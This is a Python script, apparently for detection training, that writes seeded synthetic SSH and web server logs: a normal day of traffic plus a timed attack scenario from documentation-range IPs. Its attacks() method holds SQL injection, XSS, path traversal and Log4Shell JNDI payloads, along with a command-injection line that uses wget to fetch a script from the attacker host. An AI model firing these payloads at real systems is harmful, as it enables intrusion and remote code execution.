"""Gera logs realistas com um dia de tráfego normal + um cenário de ataque.

Os IPs atacantes vêm das faixas reservadas para documentação (RFC 5737:
192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), então nenhum IP real
é acusado de nada. A semente é fixa: o resultado é sempre o mesmo.

Cenário:
  02:00  203.0.113.10   Nikto varre o site (404s em massa, .env, .git)
  03:12  203.0.113.45   força bruta no SSH (root/admin)
  03:30  203.0.113.45   ...e no formulário /login do site  (correlação!)
  05:40  198.51.100.23  password spraying no SSH com usuários inexistentes
  07:15  198.51.100.23  baixa o .env do site com sucesso (HTTP 200)
  09:00  10.0.0.5       admin loga como root direto (má prática)
  10:30  198.51.100.77  sqlmap no parâmetro ?id= (algumas respostas 200)
  13:10  192.0.2.150    tentativas de XSS na busca
  14:05  192.0.2.77     força bruta no usuário deploy... e CONSEGUE entrar
  16:20  198.51.100.200 path traversal lê /etc/passwd (HTTP 200)
  18:45  203.0.113.99   injeção de comando em /api/ping
  21:00  192.0.2.200    Log4Shell no User-Agent
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Tuple
from urllib.parse import quote

MON = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
       "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/131.0 Mobile Safari/537.36",
]
PAGES = ["/", "/", "/produtos", "/produtos/12", "/produtos/37", "/produtos/58", "/carrinho",
         "/contato", "/sobre", "/static/css/app.css", "/static/js/app.js",
         "/static/img/logo.png", "/api/produtos?pagina=2", "/busca?q=notebook"]

Line = Tuple[datetime, str]


class _Gen:
    def __init__(self, day: datetime, seed: int = 42):
        self.day = day
        self.rnd = random.Random(seed)
        self.auth: List[Line] = []
        self.web: List[Line] = []
        self.pid = 4000

    def at(self, hh: int, mm: int, ss: int = 0) -> datetime:
        return self.day.replace(hour=hh, minute=mm, second=ss)

    # ---- formatação -------------------------------------------------------
    def ssh(self, ts: datetime, msg: str) -> None:
        self.pid += self.rnd.randint(1, 9)
        self.auth.append((ts, f"{MON[ts.month - 1]} {ts.day:>2} {ts:%H:%M:%S} "
                              f"srv-prod-01 sshd[{self.pid}]: {msg}"))

    def http(self, ts: datetime, ip: str, method: str, path: str, status: int,
             ua: str, size: int = None, ref: str = "-") -> None:
        size = size if size is not None else self.rnd.randint(300, 48000)
        path = quote(path, safe="/?=&%:+,;")
        ua = ua.replace('"', '\\"')
        self.web.append((ts, f'{ip} - - [{ts:%d}/{MON[ts.month - 1]}/{ts:%Y}:{ts:%H:%M:%S} -0300] '
                             f'"{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'))

    def port(self) -> int:
        return self.rnd.randint(32768, 60999)

    # ---- tráfego legítimo -------------------------------------------------
    def normal(self) -> None:
        r = self.rnd
        admins = [("dutra", "10.0.0.12"), ("maria", "10.0.0.31"), ("deploy", "10.0.0.50")]
        for _ in range(26):
            user, ip = r.choice(admins)
            ts = self.at(r.randint(7, 22), r.randint(0, 59), r.randint(0, 59))
            if r.random() < 0.15:  # erro de digitação ocasional: NÃO deve gerar alerta
                self.ssh(ts, f"Failed password for {user} from {ip} port {self.port()} ssh2")
                ts += timedelta(seconds=r.randint(4, 12))
            self.ssh(ts, f"Accepted publickey for {user} from {ip} port {self.port()} ssh2: "
                         f"ED25519 SHA256:{r.randbytes(8).hex()}")
            self.ssh(ts, f"pam_unix(sshd:session): session opened for user {user}(uid=1000) by (uid=0)")
            end = ts + timedelta(minutes=r.randint(2, 90))
            self.ssh(end, f"Received disconnect from {ip} port {self.port()}:11: disconnected by user")

        visitors = [f"10.20.{r.randint(0, 9)}.{r.randint(2, 254)}" for _ in range(60)]
        for _ in range(2600):
            hour = r.choices(range(24), weights=[1, 1, 1, 1, 1, 1, 2, 4, 6, 8, 9, 9,
                                                 10, 9, 9, 8, 8, 8, 9, 10, 10, 8, 5, 3])[0]
            ts = self.at(hour, r.randint(0, 59), r.randint(0, 59))
            ip, ua = r.choice(visitors), r.choice(BROWSERS)
            page = r.choice(PAGES)
            status = 200 if r.random() > 0.02 else 404
            self.http(ts, ip, "GET", page, status, ua, ref="https://loja.exemplo.com.br/")
            if r.random() < 0.03:
                self.http(ts + timedelta(seconds=3), ip, "POST", "/login",
                          302 if r.random() > 0.2 else 401, ua)

    # ---- ataques ----------------------------------------------------------
    def attacks(self) -> None:
        r = self.rnd

        # Nikto
        ip, ts = "203.0.113.10", self.at(2, 0)
        ua = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:{:06d})"
        probes = ["/admin/", "/phpmyadmin/", "/backup.zip", "/.git/HEAD", "/.env", "/wp-admin/",
                  "/cgi-bin/test.cgi", "/server-status", "/config.php.bak", "/.htpasswd",
                  "/console", "/manager/html", "/db.sql", "/.DS_Store", "/test.php", "/info.php"]
        for i in range(140):
            path = probes[i] if i < len(probes) else f"/{r.choice(['old','dev','tmp','bkp','adm'])}{i}/"
            status = 200 if path == "/server-status" else 404
            self.http(ts + timedelta(seconds=i // 2), ip, "GET", path, status, ua.format(i), 290)

        # Força bruta SSH + login web do mesmo IP
        ip, ts = "203.0.113.45", self.at(3, 12)
        for i in range(70):
            user = r.choice(["root", "root", "root", "admin", "ubuntu"])
            inv = "invalid user " if user != "root" else ""
            self.ssh(ts, f"Failed password for {inv}{user} from {ip} port {self.port()} ssh2")
            ts += timedelta(seconds=r.randint(1, 4))
        ts = self.at(3, 30)
        for i in range(45):
            self.http(ts, ip, "POST", "/login", 401, "python-requests/2.32.3", 512)
            ts += timedelta(seconds=r.randint(1, 3))

        # Password spraying
        ip, ts = "198.51.100.23", self.at(5, 40)
        users = ["admin", "test", "oracle", "postgres", "ubuntu", "git", "ftp", "guest", "user",
                 "pi", "support", "jenkins", "hadoop", "minecraft", "tomcat"]
        for u in users + users:
            self.ssh(ts, f"Invalid user {u} from {ip} port {self.port()}")
            self.ssh(ts, f"Failed password for invalid user {u} from {ip} port {self.port()} ssh2")
            ts += timedelta(seconds=45)
        self.http(self.at(7, 15), ip, "GET", "/.env", 200, "curl/8.5.0", 1873)

        # Root direto da rede interna
        self.ssh(self.at(9, 0, 14), f"Accepted password for root from 10.0.0.5 port {self.port()} ssh2")

        # sqlmap
        ip, ts = "198.51.100.77", self.at(10, 30)
        ua = "sqlmap/1.8.11#stable (https://sqlmap.org)"
        payloads = [
            "1'", "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' OR '1'='1'-- -",
            "1 UNION ALL SELECT NULL,NULL,NULL-- -", "1' AND SLEEP(5)-- -",
            "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)",
            "-1 UNION SELECT table_name,2,3 FROM information_schema.tables-- -",
            "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))",
        ]
        for i in range(48):
            p = payloads[i % len(payloads)]
            status = r.choice([200, 500, 500]) if "UNION" in p else r.choice([200, 500])
            self.http(ts, ip, "GET", f"/produtos?id={p}", status, ua)
            ts += timedelta(seconds=r.randint(1, 5))

        # XSS
        ip, ts = "192.0.2.150", self.at(13, 10)
        xss = ["<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>",
               "\"><svg/onload=alert(1)>", "javascript:alert(document.domain)",
               "<iframe src=javascript:alert(1)>"]
        for i in range(10):
            self.http(ts, ip, "GET", f"/busca?q={xss[i % len(xss)]}", 400 if i % 3 else 200,
                      r.choice(BROWSERS))
            ts += timedelta(seconds=r.randint(5, 40))

        # Comprometimento: força bruta que dá certo
        ip, ts = "192.0.2.77", self.at(14, 5)
        for i in range(28):
            self.ssh(ts, f"Failed password for deploy from {ip} port {self.port()} ssh2")
            ts += timedelta(seconds=r.randint(2, 5))
        self.ssh(ts, f"Accepted password for deploy from {ip} port {self.port()} ssh2")
        self.ssh(ts, "pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)")

        # Path traversal com sucesso
        ip, ts = "198.51.100.200", self.at(16, 20)
        for p, st in [("/download?file=relatorio.pdf", 200),
                      ("/download?file=../relatorio.pdf", 403),
                      ("/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", 403),
                      ("/download?file=....//....//etc/passwd", 403),
                      ("/download?file=../../../../etc/passwd", 200),
                      ("/download?file=../../../../etc/shadow", 403),
                      ("/download?file=php://filter/convert.base64-encode/resource=index.php", 200)]:
            self.http(ts, ip, "GET", p, st, "Mozilla/5.0 (X11; Linux x86_64) curl-ish")
            ts += timedelta(seconds=r.randint(8, 30))

        # Injeção de comando
        ip, ts = "203.0.113.99", self.at(18, 45)
        for p in ["/api/ping?host=127.0.0.1", "/api/ping?host=127.0.0.1;id",
                  "/api/ping?host=127.0.0.1|whoami", "/api/ping?host=$(uname -a)",
                  "/api/ping?host=127.0.0.1;wget http://203.0.113.99/x.sh -O /tmp/x.sh"]:
            self.http(ts, ip, "GET", p, 500 if ";" in p else 200, "curl/7.88.1")
            ts += timedelta(seconds=r.randint(10, 60))

        # Log4Shell
        ip, ts = "192.0.2.200", self.at(21, 0)
        for ua in ["${jndi:ldap://192.0.2.200:1389/Exploit}",
                   "${${lower:j}ndi:${lower:l}dap://192.0.2.200/a}",
                   "${${::-j}${::-n}${::-d}${::-i}:rmi://192.0.2.200/b}"]:
            self.http(ts, ip, "GET", "/", 200, ua)
            ts += timedelta(seconds=7)

    def write(self, folder: Path) -> Tuple[Path, Path]:
        folder.mkdir(parents=True, exist_ok=True)
        auth, web = folder / "auth.log", folder / "access.log"
        for path, lines in ((auth, self.auth), (web, self.web)):
            lines.sort(key=lambda x: x[0])
            path.write_text("\n".join(l for _, l in lines) + "\n", encoding="utf-8")
        return auth, web


def generate(folder: Path, day: datetime = None) -> Tuple[Path, Path]:
    """Cria auth.log e access.log em `folder` e devolve os caminhos."""
    day = day or (datetime.now() - timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
    g = _Gen(day)
    g.normal()
    g.attacks()
    return g.write(folder)
